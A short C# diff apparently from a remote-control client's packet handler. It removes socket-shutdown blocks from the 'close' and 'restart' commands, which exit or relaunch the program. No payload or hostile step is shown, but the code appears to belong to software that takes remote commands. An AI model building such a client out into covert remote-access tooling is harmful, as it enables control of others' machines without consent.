@@ -80,12 +80,6 @@ namespace Client.Handle_Packet
 
                     case "close":
                         {
-                            try
-                            {
-                                ClientSocket.Client.Shutdown(SocketShutdown.Both);
-                                ClientSocket.Client.Dispose();
-                            }
-                            catch { }
                             Methods.ClientExit();
                             Environment.Exit(0);
                             break;
@@ -93,12 +87,6 @@ namespace Client.Handle_Packet
 
                     case "restart":
                         {
-                            try
-                            {
-                                ClientSocket.Client.Shutdown(SocketShutdown.Both);
-                                ClientSocket.Client.Dispose();
-                            }
-                            catch { }
                             Process.Start(Application.ExecutablePath);
                             Methods.ClientExit();
                             Environment.Exit(0);
